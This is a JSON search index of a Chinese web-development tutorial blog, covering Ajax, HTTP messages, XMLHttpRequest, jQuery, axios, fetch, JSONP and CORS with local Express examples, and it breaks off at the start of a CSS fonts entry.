[{"title":"Ajax（一）：概述","url":"/2022/04/20/Ajax%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E6%A6%82%E8%BF%B0/","content":"Ajax概述AJAX 简介AJAX 全称为Asynchronous JavaScript And XML，就是异步的JS 和XML\n通过AJAX 可以在浏览器中向服务器发送异步请求，最大的优势：无刷新获取数据\nAJAX 不是新的编程语言，而是一种将现有的标准组合在一起使用的新方式\nXML 简介\nXML 可扩展标记语言。\nXML 被设计用来传输和存储数据。\nXML 和HTML 类似，不同的是HTML 中都是预定义标签，而XML 中没有预定义标签，全都是自定义标签，用来表示一些数据。\n\n比如说我有一个学生数据：name &#x3D; “孙悟空” ; age &#x3D; 18 ; gender &#x3D; “男” ;用XML 表示：\n&lt;student&gt;\t&lt;name&gt;孙悟空&lt;/name&gt;\t&lt;age&gt;18&lt;/age&gt;\t&lt;gender&gt;男&lt;/gender&gt;&lt;/student&gt;\n\n现在已经被JSON 取代了。\n&#123;&quot;name&quot;:&quot;孙悟空&quot;,&quot;age&quot;:18,&quot;gender&quot;:&quot;男&quot;&#125;\n\nAJAX 的特点1.3.1 AJAX 的优点\n可以无需刷新页面而与服务器端进行通信\n允许你根据用户事件来更新部分页面内容\n\n1.3.2 AJAX 的缺点\n没有浏览历史，不能回退\n存在跨域问题(同源)\nSEO （Search Engine Optimization，搜索引擎优化）不友好（爬虫看不到）\n\n","categories":["Ajax"],"tags":["Ajax"]},{"title":"Ajax（七）：跨域","url":"/2022/04/20/Ajax%EF%BC%88%E4%B8%83%EF%BC%89%EF%BC%9A%E8%B7%A8%E5%9F%9F/","content":"同源策略\n同源策略(Same-Origin Policy)最早由Netscape 公司提出，是浏览器的一种安全策略\n\n同源： 当前网页的url和Ajax请求的目标资源的url，两者的协议、域名、端口号必须完全相同\n\n跨域： 违背同源策略就是跨域，\n项目中常出现，因为单台服务器性能是有上限的，需要增加不同的服务器对服务进行划分\n\nAjax默认遵循同源策略\n\n\n\n当一个请求在浏览器端发送出去后，服务端是会收到的并且也会处理和响应，只不过浏览器在解析这个请求的响应之后，发现不属于浏览器的同源策略（地址里面的协议、域名和端口号均相同）也没有包含正确的 CORS 响应头，返回结果被浏览器给拦截了。\n\nserver.js\nconst express = require(&#x27;express&#x27;);const app = express();app.get(&#x27;/home&#x27;, (request, response)=&gt;&#123;    //响应一个页面   __dirname获取绝对路径    response.sendFile(__dirname + &#x27;/index.html&#x27;);&#125;);app.get(&#x27;/data&#x27;, (request, response)=&gt;&#123;    response.send(&#x27;用户数据&#x27;);&#125;);app.listen(9000, ()=&gt;&#123;    console.log(&quot;服务已经启动...&quot;);&#125;);\n\nindex.html\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;首页&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;h1&gt;尚硅谷&lt;/h1&gt;    &lt;button&gt;点击获取用户数据&lt;/button&gt;    &lt;script&gt;        const btn = document.querySelector(&#x27;button&#x27;);        btn.onclick = function()&#123;            const x = new XMLHttpRequest();            //这里因为是满足同源策略的, 所以 url 可以简写            x.open(&quot;GET&quot;,&#x27;/data&#x27;);            //发送            x.send();            //            x.onreadystatechange = function()&#123;                if(x.readyState === 4)&#123;                    if(x.status &gt;= 200 &amp;&amp; x.status &lt; 300)&#123;                        console.log(x.response);                    &#125;                &#125;            &#125;        &#125;    &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n如何解决跨域JSONPJSONP 是什么JSONP(JSON with Padding)，是一个非官方的跨域解决方案，纯粹凭借程序员的聪明才智开发出来，只支持get 请求。\nJSONP 怎么工作的？在网页有一些标签天生具有跨域能力，比如：img link iframe script。JSONP 就是利用script 标签的跨域能力来发送请求的。\nJSONP 的使用\n动态的创建一个script 标签\nvar script = document.createElement(&quot;script&quot;);\n\n设置script 的src，设置回调函数\nscript.src = &quot;http://localhost:3000/testAJAX?callback=abc&quot;;function abc(data) &#123;\talert(data.name);&#125;;\n\n将script 添加到body 中\ndocument.body.appendChild(script);\n\n服务器中路由的处理\nrouter.get(&quot;/testAJAX&quot; , function (req , res) &#123;\tconsole.log(&quot;收到请求&quot;);\tvar callback = req.query.callback;\tvar obj = &#123;\t\tname:&quot;孙悟空&quot;,\t\tage:18\t&#125;\tres.send(callback+&quot;(&quot;+JSON.stringify(obj)+&quot;)&quot;);&#125;);\n\n原生jsonp实践\n前端html\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;案例&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    用户名: &lt;input type=&quot;text&quot; id=&quot;username&quot;&gt;    &lt;p&gt;&lt;/p&gt;    &lt;script&gt;        //获取 input 元素        const input = document.querySelector(&#x27;input&#x27;);        const p = document.querySelector(&#x27;p&#x27;);                //声明 handle 函数        function handle(data)&#123;            input.style.border = &quot;solid 1px #f00&quot;;            //修改 p 标签的提示文本            p.innerHTML = data.msg;        &#125;        //绑定事件        input.onblur = function()&#123;            //获取用户的输入值            let username = this.value;            //向服务器端发送请求 检测用户名是否存在            //1. 创建 script 标签            const script = document.createElement(&#x27;script&#x27;);            //2. 设置标签的 src 属性            script.src = &#x27;http://127.0.0.1:8000/check-username&#x27;;            //3. 将 script 插入到文档中            document.body.appendChild(script);        &#125;    &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\nserver.js\n//用户名检测是否存在app.all(&#x27;/check-username&#x27;,(request, response) =&gt; &#123;    // response.send(&#x27;console.log(&quot;hello jsonp&quot;)&#x27;);    const data = &#123;        exist: 1,        msg: &#x27;用户名已经存在&#x27;    &#125;;    //将数据转化为字符串    let str = JSON.stringify(data);    //返回结果    response.end(`handle($&#123;str&#125;)`);&#125;);\n\n使用jQuery发送jsonp请求&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;\t&lt;head&gt;\t\t&lt;meta charset=&quot;UTF-8&quot;&gt;\t\t&lt;title&gt;Title&lt;/title&gt;\t&lt;/head&gt;\t&lt;body&gt;\t\t&lt;button id=&quot;btn&quot;&gt;按钮&lt;/button&gt;\t\t&lt;ul id=&quot;list&quot;&gt;&lt;/ul&gt;\t\t&lt;script type=&quot;text/javascript&quot; src=&quot;./jquery-1.12.3.js&quot;&gt;&lt;/script&gt;\t\t&lt;script type=&quot;text/javascript&quot;&gt;\t\t\twindow.onload = function () &#123;\t\t\t\tvar btn = document.getElementById(&#x27;btn&#x27;)\t\t\t\tbtn.onclick = function () &#123;\t\t\t\t\t$.getJSON(&quot;http://api.douban.com/v2/movie/in_theaters?callback=?&quot;,function(data) &#123;\t\t\t\t\t\tconsole.log(data);\t\t\t\t\t\t//获取所有的电影的条目\t\t\t\t\t\tvar subjects = data.subjects;\t\t\t\t\t\t//遍历电影条目\t\t\t\t\t\tfor(var i=0 ; i&lt;subjects.length ; i++)&#123;\t\t\t\t\t\t\t$(&quot;#list&quot;).append(&quot;&lt;li&gt;&quot;+\t\t\t\t\t\t\tsubjects[i].title+&quot;&lt;br /&gt;&quot;+\t\t\t\t\t\t\t&quot;&lt;img src=\\&quot;&quot;+subjects[i].images.large+&quot;\\&quot; &gt;&quot;+\t\t\t\t\t\t\t&quot;&lt;/li&gt;&quot;);\t\t\t\t\t\t&#125;\t\t\t\t\t&#125;);\t\t\t\t&#125;\t\t\t&#125;\t\t&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\nCORShttps://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS\nCORS 是什么？CORS（Cross-Origin Resource Sharing），跨域资源共享。\nCORS 是官方的跨域解决方案，它的特点是不需要在客户端做任何特殊的操作，完全在服务器中进行处理，支持get 和post 请求。跨域资源共享标准新增了一组HTTP 首部字段，允许服务器声明哪些源站通过浏览器有权限访问哪些资源\nCORS 怎么工作的？CORS 是通过设置一个响应头来告诉浏览器，该请求允许跨域，浏览器收到该响应以后就会对响应放行。\nCORS 的使用主要是服务器端的设置：\nrouter.get(&quot;/testAJAX&quot; , function (req , res) &#123;\t//通过set 来设置响应头，来允许跨域请求\t//res.set(&quot;Access-Control-Allow-Origin&quot;,&quot;http://127.0.0.1:3000&quot;);\tres.set(&quot;Access-Control-Allow-Origin&quot;,&quot;*&quot;);\tres.send(&quot;testAJAX 返回的响应&quot;);&#125;);\n\n\n代码示例\n前端html\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;CORS&lt;/title&gt;    &lt;style&gt;        #result&#123;            width:200px;            height:100px;            border:solid 1px #90b;        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;button&gt;发送请求&lt;/button&gt;    &lt;div id=&quot;result&quot;&gt;&lt;/div&gt;    &lt;script&gt;        const btn = document.querySelector(&#x27;button&#x27;);        btn.onclick = function()&#123;            //1. 创建对象            const x = new XMLHttpRequest();            //2. 初始化设置            x.open(&quot;GET&quot;, &quot;http://127.0.0.1:8000/cors-server&quot;);            //3. 发送            x.send();            //4. 绑定事件            x.onreadystatechange = function()&#123;                if(x.readyState === 4)&#123;                    if(x.status &gt;= 200 &amp;&amp; x.status &lt; 300)&#123;                        //输出响应体                        console.log(x.response);                    &#125;                &#125;            &#125;        &#125;    &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\nserver.js\napp.all(&#x27;/cors-server&#x27;, (request, response)=&gt;&#123;    //设置响应头    response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);    response.setHeader(&quot;Access-Control-Allow-Headers&quot;, &#x27;*&#x27;);    response.setHeader(&quot;Access-Control-Allow-Method&quot;, &#x27;*&#x27;);    // response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;http://127.0.0.1:5500&quot;);    response.send(&#x27;hello CORS&#x27;);&#125;);\n\n","categories":["Ajax"],"tags":["跨域","同源策略","JSONP","CORS"]},{"title":"Ajax（三）：原生Ajax","url":"/2022/04/20/Ajax%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9A%E5%8E%9F%E7%94%9FAjax/","content":"理解\n使用XMLHttpRequest (XHR)对象可以与服务器交互, 也就是发送ajax 请求\n\n前端可以获取到数据，而无需让整个的页面刷新。\n\n这使得Web 页面可以只更新页面的局部，而不影响用户的操作。\n\n\nhttps://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequestXMLHttpRequest，AJAX 的所有操作都是通过该对象进行的\n核心对象使用步骤创建XMLHttpRequest 对象var xhr = new XMLHttpRequest();var xhr = new XMLHttpRequest();\n\n\n\n设置请求信息（请求方法和url）// 请求方式xhr.open(method, url);//可以设置请求头，一般不设置xhr.setRequestHeader(&#x27;Content-Type&#x27;, &#x27;application/x-www-form-urlencoded&#x27;);\n\n\n\n发送请求xhr.send(body) //get请求不传 body 参数，只有post请求使用\n\n\n\n接收响应（事件绑定，处理服务端返回的结果）//xhr.responseXML 接收 xml格式 的响应数据//xhr.responseText 接收 文本格式 的响应数据xhr.onreadystatechange = function ()&#123;\t// readyState 是 xhr对象中的属性, 表示状态 0 1 2 3 4\tif(xhr.readyState == 4 &amp;&amp; xhr.status == 200)&#123;\t\tvar text = xhr.responseText;\t\tconsole.log(text);\t&#125;&#125;\n\n案例GET请求服务器端 server.js\n// 1. 引入expressconst express = require(&#x27;express&#x27;);// 2. 创建应用对象const app = express();// 3. 创建路由规则app.get(&#x27;/server&#x27;, (request, response) =&gt; &#123;  // 设置响应头 设置允许跨域  response.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;);  // 设置响应体  response.send(&quot;Hello Ajax&quot;);&#125;);// 4. 监听服务app.listen(8000, () =&gt; &#123;  console.log(&quot;服务已经启动, 8000 端口监听中...&quot;); &#125;)\n\n浏览器端页面 get.html\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;  &lt;title&gt;Ajax GET 请求&lt;/title&gt;  &lt;style&gt;    #result &#123;      width: 200px;      height: 100px;      border: solid 1px #90b;    &#125;  &lt;/style&gt;&lt;/head&gt;&lt;body&gt;  &lt;button&gt;点击发送请求&lt;/button&gt;  &lt;div id=&quot;result&quot;&gt;&lt;/div&gt;  &lt;script&gt;    //获取button元素    const btn = document.getElementsByTagName(&#x27;button&#x27;)[0];    const result = document.getElementById(&#x27;result&#x27;);    //绑定事件    btn.onclick = function()&#123;      // 1. 创建对象       const xhr = new XMLHttpRequest();      // 2. 初始化 设置请求方法和url      xhr.open(&#x27;GET&#x27;, &#x27;http://127.0.0.1:8000/server&#x27;)      // 3. 发送      xhr.send();      // 4. 事件绑定 处理服务端返回的结果      xhr.onreadystatechange = function()&#123;        // readyState 是 xhr 对象中的属性, 表示状态 0 1 2 3 4        //判断 (服务端返回了所有的结果)        if(xhr.readyState === 4)&#123;          //判断响应状态码 200  404  403 401 500          if(xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300)&#123;            // 处理结果 行 头 空行 体            // 响应            console.log(&#x27;状态码&#x27;, xhr.status); // 状态码            console.log(&#x27;状态字符串&#x27;, xhr.statusText); // 状态字符串            console.log(&#x27;所有响应头&#x27;, xhr.getAllResponseHeaders()); // 所有响应头            console.log(&#x27;响应体&#x27;, xhr.response); // 响应体                        //设置 result 的文本            result.innerHTML=xhr.response;          &#125;else&#123;          &#125;        &#125;      &#125;     &#125;  &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n\nGET设置请求参数xhr.open(&#x27;GET&#x27;, &#x27;http://127.0.0.1:8000/server?a=100&amp;b=200&amp;c=300&#x27;);\n\nPOST请求\n鼠标放到div中，发post请求，将响应体放在div中呈现\n\nserver.js添加post\napp.post(&#x27;/server&#x27;, (request, response) =&gt; &#123;  // 设置响应头, 设置允许跨域  response.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;);  // 设置响应体  response.send(&quot;Hello Ajax POST&quot;);&#125;);\n\npost.html\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;  &lt;title&gt;Ajax POST 请求&lt;/title&gt;  &lt;style&gt;    #result &#123;      width: 200px;      height: 100px;      border: solid 1px #903;    &#125;  &lt;/style&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id=&quot;result&quot;&gt;&lt;/div&gt;  &lt;script&gt;    // 获取元素对象    const result = document.getElementById(&#x27;result&#x27;);    // 绑定事件    result.addEventListener(&quot;mouseover&quot;, function()&#123;      // 1. 创建对象      const xhr = new XMLHttpRequest();      // 2. 初始化 设置类型（请求方式）与url      xhr.open(&#x27;POST&#x27;, &#x27;http://127.0.0.1:8000/server&#x27;);      // 3. 发送   设置请求参数（请求体）      xhr.send(&#x27;a=100&amp;b=200&amp;c=300&#x27;);      // 4. 事件绑定      xhr.onreadystatechange = function()&#123;        // 判断        if(xhr.readyState === 4)&#123;          if(xhr.status &gt;=200 &amp;&amp; xhr.status &lt; 300)&#123;            // 处理服务端返回的结果            result.innerHTML = xhr.response;          &#125;        &#125;      &#125;    &#125;);  &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n\nPOST设置请求头信息// 设置请求体内容的类型xhr.setRequesHeader(&#x27;Content-Type&#x27;,&#x27;application/x-www-from-urlencoded&#x27;);// 自定义头信息xhr.setRequesHeader(&#x27;name&#x27;, &#x27;atguigu&#x27;);\n\n\n请求头中可放身份校验信息，发送给后端进行身份校验\n\nserver.js中设置响应头允许自定义请求头 并把post改成all\n//可以接收任意类型的请求 app.all(&#x27;/server&#x27;, (request, response) =&gt; &#123;  // 设置响应头, 设置允许跨域  response.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;);  //设置响应头 可接受所有类型的头信息（包括自定义）  response.setHeader(&#x27;Access-Control-Allow-Header&#x27;,&#x27;*&#x27;);  // 设置响应体  response.send(&quot;Hello Ajax POST&quot;);&#125;);\n\njson数据请求server.js\napp.all(&#x27;/json-server&#x27;, (request, response) =&gt; &#123;  // 设置响应头, 设置允许跨域  response.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;);  // 设置响应头, 设置允许自定义头信息  response.setHeader(&#x27;Access-Control-Allow-Headers&#x27;, &#x27;*&#x27;);  // 响应一个数据  const data = &#123;    name: &#x27;atguigu&#x27;  &#125;;  // 对 对象 进行 字符串 转换  let str = JSON.stringify(data)  // 设置响应体   response.send(str);&#125;);\n\nhtml\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;  &lt;title&gt;JSON&lt;/title&gt;  &lt;style&gt;    #result &#123;      width: 200px;      height: 100px;      border: solid 1px #89b;    &#125;  &lt;/style&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id=&quot;result&quot;&gt;&lt;/div&gt;  &lt;script&gt;    const result = document.getElementById(&#x27;result&#x27;);    // 绑定键盘按下事件    window.onkeydown = function()&#123;      // 发送请求      const xhr = new XMLHttpRequest();      // *2*.(自动转换) 设置响应体数据的类型(自动转换)      xhr.responseType = &#x27;json&#x27;;      // 初始化      xhr.open(&#x27;GET&#x27;, &#x27;http://127.0.0.1:8000/json-server&#x27;);      // 发送      xhr.send();      // 事件绑定      xhr.onreadystatechange = function()&#123;        if(xhr.readyState === 4)&#123;          if(xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300)&#123;            console.log(xhr.response);            // 1. 手动对数据转化 (字符串再转换成json)            // let data = JSON.parse(xhr.response); //转换成json            // result.innerHTML = data.name;            // *2*. (自动转换)自动转换(自动转换)            result.innerHTML = xhr.response.name; //已经自动变成json          &#125;        &#125;      &#125;    &#125;  &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n请求超时与网络异常超时或网络异常时，自动取消请求\n// 超时设置 （2秒）xhr.timeout = 2000;// 超时回调xhr.ontimeout = function()&#123;\talert(&#x27;网络超时，请稍后重试&#x27;)&#125;// 网络异常回调xhr.onerror = function()&#123;\talert(&#x27;网络异常，请稍后重试&#x27;)&#125;\n\n取消请求人工取消请求\n// 手动取消xhr.abort()\n\n重复请求问题let x = null;//标识变量let isSending = false; // 是否正在发送AJAX请求btns[0].onclick = function()&#123;    //判断标识变量    if(isSending) x.abort();// 如果正在发送, 则取消该请求, 创建一个新的请求    x = new XMLHttpRequest();    //修改 标识变量的值    isSending = true;    x.open(&quot;GET&quot;,&#x27;http://127.0.0.1:8000/delay&#x27;);    x.send();    x.onreadystatechange = function()&#123;        if(x.readyState === 4)&#123;            //修改标识变量            isSending = false;        &#125;    &#125;&#125;// abortbtns[1].onclick = function()&#123;    x.abort();&#125;\n\n解决 IE 缓存问题\n问题：在一些浏览器中(IE),由于缓存机制的存在，ajax 只会发送的第一次请求，剩余多次请求不会在发送给浏览器而是直接加载缓存中的数据。\n\n解决方式：浏览器的缓存是根据url 地址来记录的，所以我们只需要修改url 地址即可避免缓存问题\nxhr.open(&quot;get&quot;,&quot;/testAJAX?t=&quot;+Date.now());\n\nAJAX 请求状态xhr.readyState 可以用来查看请求当前的状态https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/readyState\n\n\n0: 表示XMLHttpRequest 实例已经生成，但是open()方法还没有被调用\n1: 表示send()方法还没有被调用，仍然可以使用setRequestHeader()，设定HTTP请求的头信息\n2: 表示send()方法已经执行，并且头信息和状态码已经收到\n3: 表示正在接收服务器传来的body 部分的数据\n4: 表示服务器数据已经完全接收，或者本次接收已经失败了\n\nAPI总结\nXMLHttpRequest()：创建 XHR 对象的构造函数\nstatus：响应状态码值，如 200、404\nstatusText：响应状态文本，如 ’ok‘、‘not found’\nreadyState：标识请求状态的只读属性 0-1-2-3-4\nonreadystatechange：绑定 readyState 改变的监听\nresponseType：指定响应数据类型，如果是 ‘json’，得到响应后自动解析响应\nresponse：响应体数据，类型取决于 responseType 的指定\ntimeout：指定请求超时时间，默认为 0 代表没有限制\nontimeout：绑定超时的监听\nonerror：绑定请求网络错误的监听\nopen()：初始化一个请求，参数为：(method, url[, async])\nsend(data)：发送请求\nabort()：中断请求 （发出到返回之间）\ngetResponseHeader(name)：获取指定名称的响应头值\ngetAllResponseHeaders()：获取所有响应头组成的字符串\nsetRequestHeader(name, value)：设置请求头\n\n","categories":["Ajax"],"tags":["原生Ajax"]},{"title":"Ajax（二）：HTTP","url":"/2022/04/20/Ajax%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9AHTTP/","content":"http\nHTTP（hypertext transport protocol）超文本传输协议，协议详细规定了浏览器和万维网服务器之间相互通信的规则\n约定、规则\n\nMDN 文档https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview\nHTTP 请求交互的基本过程\n-  前后应用从浏览器端向服务器发送HTTP 请求(请求报文)\n\n后台服务器接收到请求后, 调度服务器应用处理请求, 向浏览器端返回HTTP响应(响应报文)\n浏览器端接收到响应, 解析显示响应体&#x2F;调用监视回调\n\nHTTP 请求报文\n请求行\n\n  格式：method &#x2F; url 协议版本  GET / product_detail?id=2 HTTP/1.1  POST /login\n\n多个请求头\n\n  格式：名字: 值\n  Host: www.baidu.com  Cookie: BAIDUID=AD3B0FA706E; BIDUPSID=AD3B0FA706;  Content-Type: application/x-www-form-urlencoded 或者application/json\n  User-Agent: chrome 83\n\n空行\n请求体\n\n\n如果是GET请求，请求体为空\n如果是POST请求，请求体可以不为空\n\n  username=tom&amp;pwd=123  {“username”: “tom”, “pwd”: 123}\nHTTP 响应报文\n响应状态行格式：协议版本 响应状态码 响应状态字符串\nHTTP&#x2F;1.1 200 OK\n\n多个响应头格式：名字: 值\nContent-Type: text/html;charset=utf-8\nContent-length: 2048\nContent-encoding: gzip\nSet-Cookie: BD_CK_SAM=1;path=/\n\n空行\n响应体html 文本 &#x2F; json 文本 &#x2F; js&#x2F;css&#x2F;图片…\n\n\npost 请求体参数格式\nContent-Type: application/x-www-form-urlencoded;charset=utf-8\n用于键值对参数，参数的键值用&#x3D;连接, 参数之间用&amp;连接\n例如: name=%E5%B0%8F%E6%98%8E&amp;age=12\n\nContent-Type: application/json;charset=utf-8\n用于 json 字符串参数\n例如: &#123;&quot;name&quot;: &quot;%E5%B0%8F%E6%98%8E&quot;, &quot;age&quot;: 12&#125;\n\nContent-Type: multipart/form-data\n用于文件上传请求\n\n\n常见的响应状态码\n200 OK 请求成功。一般用于GET 与POST 请求\n201 Created 已创建。成功请求并创建了新的资源\n401 Unauthorized 未授权&#x2F;请求要求用户的身份认证\n404 Not Found 服务器无法根据客户端的请求找到资源\n500 Internal Server Error 服务器内部错误，无法完成请求\n\n不同类型的请求及其作用\nGET: 从服务器端读取数据（查）\nPOST: 向服务器端添加新数据 （增）\nPUT: 更新服务器端已经数据 （改）\nDELETE: 删除服务器端数据 （删）\n\nAPI 的分类\nREST API: restful （Representational State Transfer (资源)表现层状态转化）\n(1) 发送请求进行CRUD 哪个操作由请求方式来决定\n(2) 同一个请求路径可以进行多个操作\n(3) 请求方式会用到GET&#x2F;POST&#x2F;PUT&#x2F;DELETE\n\n非REST API: restless\n(1) 请求方式不决定请求的CRUD 操作\n(2) 一个请求路径只对应一个操作\n(3) 一般只有GET&#x2F;POST\n\n\n区别 一般http请求 与 ajax请求\najax请求 是一种特别的 http请求\n对服务器端来说, 没有任何区别, 区别在浏览器端\n浏览器端发请求: 只有XHR 或fetch 发出的才是ajax 请求, 其它所有的都是非ajax 请求\n浏览器端接收到响应\n一般请求: 浏览器一般会直接显示响应体数据, 也就是我们常说的刷新&#x2F;跳转页面\najax请求: 浏览器不会对界面进行任何更新操作, 只是调用监视的回调函数并传入响应相关数据\n\n\n\n","categories":["Ajax"],"tags":["HTTP"]},{"title":"Ajax（五）：Axios发送Ajax请求","url":"/2022/04/20/Ajax%EF%BC%88%E4%BA%94%EF%BC%89%EF%BC%9AAxios%E5%8F%91%E9%80%81Ajax%E8%AF%B7%E6%B1%82/","content":"axios介绍axios不是一种新的技术。\naxios 是一个基于Promise 用于浏览器和 nodejs 的 HTTP 客户端，本质上也是对原生XHR的封装，只不过它是Promise的实现版本，符合最新的ES规范，有以下特点：\n\n从浏览器中创建 XMLHttpRequests\n从 node.js 创建 http 请求\n支持 Promise API\n拦截请求和响应\n转换请求数据和响应数据\n取消请求\n自动转换 JSON 数据\n客户端支持防御 XSRF\n\nget请求axios#get(url[,config])\n\n//GET 请求axios.get(&#x27;/axios-server&#x27;, &#123;    //url 参数    params: &#123;        id: 100,        vip: 7    &#125;,    //请求头信息    headers: &#123;        name: &#x27;atguigu&#x27;,        age: 20    &#125;&#125;).then(value =&gt; &#123;    console.log(value);&#125;);\n\npost请求axios#post(url[,data[,config]])\n\naxios.post(&#x27;/axios-server&#x27;, &#123;    username: &#x27;admin&#x27;,    password: &#x27;admin&#x27;&#125;, &#123;    //url     params: &#123;        id: 200,        vip: 9    &#125;,    //请求头参数    headers: &#123;        height: 180,        weight: 180,    &#125;&#125;);\n\n通用方法axios(&#123;    //请求方法    method : &#x27;POST&#x27;,    //url    url: &#x27;/axios-server&#x27;,    //url参数    params: &#123;        vip:10,        level:30    &#125;,    //头信息    headers: &#123;        a:100,        b:200    &#125;,    //请求体参数    data: &#123;        username: &#x27;admin&#x27;,        password: &#x27;admin&#x27;    &#125;&#125;).then(response=&gt;&#123;    //响应状态码    console.log(response.status);    //响应状态字符串    console.log(response.statusText);    //响应头信息    console.log(response.headers);    //响应体    console.log(response.data);&#125;)\n\n更多配置查看jQuery文档\n","categories":["Ajax"],"tags":["Ajax","Axios"]},{"title":"Ajax（六）：使用fetch函数发送Ajax请求","url":"/2022/04/20/Ajax%EF%BC%88%E5%85%AD%EF%BC%89%EF%BC%9A%E4%BD%BF%E7%94%A8fetch%E5%87%BD%E6%95%B0%E5%8F%91%E9%80%81Ajax%E8%AF%B7%E6%B1%82/","content":"语法Promise&lt;Response&gt; fetch(input[,init]);\n\n\ninput：url\ninit：配置项\n\nfetch(&#x27;http://127.0.0.1:8000/fetch-server?vip=10&#x27;, &#123;    //请求方法    method: &#x27;POST&#x27;,    //请求头    headers: &#123;        name:&#x27;atguigu&#x27;    &#125;,    //请求体    body: &#x27;username=admin&amp;password=admin&#x27;&#125;).then(response =&gt; &#123;    // return response.text();    return response.json();&#125;).then(response=&gt;&#123;    console.log(response);&#125;);\n\n","categories":["Ajax"],"tags":["Ajax","fetch"]},{"title":"Ajax（四）：jQuery中的Ajax","url":"/2022/04/20/Ajax%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9AjQuery%E4%B8%AD%E7%9A%84Ajax/","content":"get请求$.get(url, [data], [callback], [type])\n\n\nurl:请求的URL 地址\ndata:请求携带的参数\ncallback:载入成功时回调函数\ntype:设置返回内容格式，xml, html, script, json, text, _default\n\n$(&#x27;button&#x27;).eq(0).click(function()&#123;            $.get(&#x27;http://127.0.0.1:8000/jquery-server&#x27;, &#123;a:100, b:200&#125;, function(data)&#123;                console.log(data);            &#125;,&#x27;json&#x27;);        &#125;);\n\npost请求$.post(url, [data], [callback], [type])\n\n\nurl:请求的URL 地址\ndata:请求携带的参数\ncallback:载入成功时回调函数\ntype:设置返回内容格式，xml, html, script, json, text, _default\n\n$(&#x27;button&#x27;).eq(1).click(function()&#123;            $.post(&#x27;http://127.0.0.1:8000/jquery-server&#x27;, &#123;a:100, b:200&#125;, function(data)&#123;                console.log(data);            &#125;);        &#125;);\n\n通用方法$.ajax(&#123;\t// url\turl: &#x27;http://127.0.0.1:8000/jquery-server&#x27;,\t// 参数\tdata: &#123;a:100, b:200&#125;,\t// 请求类型\ttype: &#x27;GET&#x27;,\t// 响应体结果\tdataType: &#x27;json&#x27;,\t// 成功的回调\tsuccess: function(data)&#123;console.log(data);&#125;,\t// 超时时间\ttimeout: 2000,\t// 失败的回调\terror: function()&#123;console.log(&#x27;出错拉~&#x27;);&#125;,\t// 头信息\theaders: &#123;\t\tc: 300,\t\td: 400\t&#125;\t&#125;)\n\n更多配置查看jQuery文档\n","categories":["Ajax"],"tags":["Ajax","jQuery"]},{"title":"CSS基础（七）：字体","url":"/2022/03/02/CSS%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%83%EF%BC%89%EF%BC%9A%E5%AD%97%E4%BD%93/","content":"字体相关样式\ncolor  字体颜色（严格：前景色，一般用来设置字体颜色）\n\nfont-size：字体大小\n\n1 em &#x3D; 当前元素的一个font-size\n1 rem &#x3D; 